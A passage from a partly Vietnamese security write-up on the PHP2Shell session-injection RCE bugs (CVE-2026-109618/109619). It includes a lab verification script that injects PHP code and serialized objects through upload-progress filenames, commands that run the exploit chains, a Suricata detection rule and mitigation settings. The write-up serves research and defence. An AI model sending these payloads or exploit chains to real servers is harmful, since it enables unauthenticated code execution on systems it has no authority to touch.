        f"Connection: close\r\n\r\n"
    ).encode() + body

    s = socket.create_connection((host, port), timeout=15)
    s.sendall(req)
    s.settimeout(10)
    resp = b""
    while True:
        try:
            d = s.recv(65536)
            if not d: break
            resp += d
        except socket.timeout: break
    s.close()
    return resp

if __name__ == "__main__":
    host, port = "127.0.0.1", 18080
    sid_base = "verifysession00000000000000"

    print("[*] CVE-2026-109618/109619 — Session Injection Verification\n")

    # Test 1: Normal filename
    print("[1] Normal filename...")
    send_upload(host, port, "/index.php", sid_base + "a", "normal.txt")
    print("    → Check: cat /tmp/sessions/sess_" + sid_base + "a")

    # Test 2: PHP code in filename
    php_payload = "<?php system('id');echo 'RCE';?>"
    print(f"[2] PHP code in filename: {php_payload}")
    send_upload(host, port, "/index.php", sid_base + "b", php_payload)
    print("    → Check: cat /tmp/sessions/sess_" + sid_base + "b")

    # Test 3: Pipe + serialized object (handler mismatch trigger)
    pipe_payload = 'x|O:8:\\"stdClass\\":0:{}'
    print(f"[3] Pipe + serialized object in filename")
    send_upload(host, port, "/index.php", sid_base + "c", pipe_payload)
    print("    → Check: cat /tmp/sessions/sess_" + sid_base + "c")

    print("\n[*] Key indicators:")
    print("    - Session file created with attacker-controlled SID ✓")
    print("    - Raw PHP code in session data ✓")
    print("    - Serialized objects injectable via pipe character ✓")
    print("    - No authentication required ✓")
```

---

## 5. Lab Setup

Repo cung cấp Docker lab với cả PHP-FPM + nginx và Apache mod_php:

```bash
git clone https://github.com/ikow/php2shell-poc.git && cd php2shell-poc

# Start lab
cd lab && docker compose up -d

# Verify chains:
python3 ../poc/verify_session_injection.py --target http://127.0.0.1:18080
python3 ../poc/verify_handler_mismatch.py --target http://127.0.0.1:18080
python3 ../poc/verify_oom_trigger.py --host 127.0.0.1 --port 18081
python3 ../poc/verify_fpm_stale_state.py --target http://127.0.0.1:18080

# Run exploits:
python3 ../exploit/chain_a_session_lfi.py --host 127.0.0.1 --port 18080 --command 'id'
php ../exploit/chain_b_uaf_rce.php
python3 ../exploit/chain_c_mismatch_rce.py --host 127.0.0.1 --port 18080 --command 'id'
```

| Port | Service | Chains |
|------|---------|--------|
| 18080 | nginx + PHP-FPM | A, B, C, E |
| 18081 | Apache mod_php | A, D |

---

## 6. Detection & Mitigation

### Immediate Mitigation

```ini
; php.ini — giảm attack surface
session.upload_progress.enabled = Off
session.use_only_cookies = On
session.use_strict_mode = On

; Đảm bảo consistent handler
session.serialize_handler = php_serialize
```

**Lưu ý:** Tắt `upload_progress` **KHÔNG** fix var_destroy UAF hoặc serializer leak. **Cập nhật PHP là cách duy nhất.**

### Patched Versions

| Branch | Fixed Version |
|--------|--------------|
| 8.2.x | **8.2.35** |
| 8.3.x | **8.3.36** |
| 8.4.x | **8.4.27** |
| 8.5.x | **8.5.12** |
| 5.6 – 8.1 | **EOL — no official fix** |

### WAF / IDS Detection

Block `PHP_SESSION_UPLOAD_PROGRESS` trong multipart POST bodies — gần như không có legitimate use:

```
# Suricata rule (từ repo detection/php2shell.rules)
alert http any any -> any any (msg:"PHP2SHELL session upload_progress injection attempt";
  flow:established,to_server; http.method; content:"POST";
  http.content_type; content:"multipart/form-data";
  file.data; content:"PHP_SESSION_UPLOAD_PROGRESS";
  classtype:web-application-attack; sid:2026001; rev:1;)
```

### Quick Check

```bash
# Check PHP version
php -r 'echo PHP_VERSION, PHP_EOL;'

# Check upload_progress setting
php -r 'echo ini_get("session.upload_progress.enabled"), PHP_EOL;'

# Check for handler mismatch across directories
find /var/www -name ".user.ini" -exec grep -l "serialize_handler" {} \;

# Monitor exploitation attempts
grep -r "PHP_SESSION_UPLOAD_PROGRESS" /var/log/nginx/access.log
```

---

## 7. References & Sources

### Primary Sources
- [ikow/php2shell-poc — GitHub Repository](https://github.com/ikow/php2shell-poc) — PoC code, exploit code, detection rules, Docker lab
- [The Hacker News — PHP Issues Emergency Patches](https://thehackernews.com/2026/10/php-issues-emergency-patches-for-two.html)
- [Sansec Research — PHP2Shell](https://sansec.io/research/php2shell) — PHPSESSID heap leak discovery
- [Bitdefender Technical Advisory](https://www.bitdefender.com/en-us/blog/businessinsights/technical-advisory-php2shell-pre-auth-rce)
- [Brandefense — PHP2Shell Fixed Versions](https://brandefense.io/blog/php2shell-php-rce-cve-2026-109618-109619/)

### Analysis & Detection
- [Ellio.tech — What We Observed](https://ellio.tech/en/blog/php2shell-what-we-observed-and-what-to-do/) — exploitation traffic analysis
- [Abstract Security — Critical PHP RCE](https://www.abstract.security/blog/php2shell-critical-php-rce-vulnerabilities-cve-2026-109618-and-cve-2026-109619)
- [Upwind — Initial Assessment](https://www.upwind.io/feed/initial-assessment-php2shell-two-critical-unpatched-php-rces-cve-2026-109618-cve-2026-109619)
- [SOCRadar — Affected Versions & Fix](https://socradar.io/blog/php2shell-cve-2026-109618-cve-2026-109619/)
- [DEV Community — Lab Demo & Fix](https://dev.to/slabb/php2shell-two-critical-rces-in-php-core-lab-demo-and-how-to-fix-cve-2026-109618-and-2ieb)

### Security Advisories
- [GHSA-w8hw-w9fx-j79w](https://github.com/advisories/GHSA-w8hw-w9fx-j79w) — CVE-2026-109618
- [GHSA-6wmf-4rv5-p3rp](https://github.com/advisories/GHSA-6wmf-4rv5-p3rp) — CVE-2026-109619
- PHP Patch Commit `3584a98` — 300 files, Zend engine + extensions

### Background Research
- [PHP Bug #71101](https://bugs.php.net/bug.php?id=71101) — Session handler mismatch (original report)
- cnpanda — Handler mismatch exploitation techniques
- Calif.IO — Serializable UAF analysis
- dinosn — var_destroy UAF discovery

---

*Report generated for authorized security research and educational purposes only.*
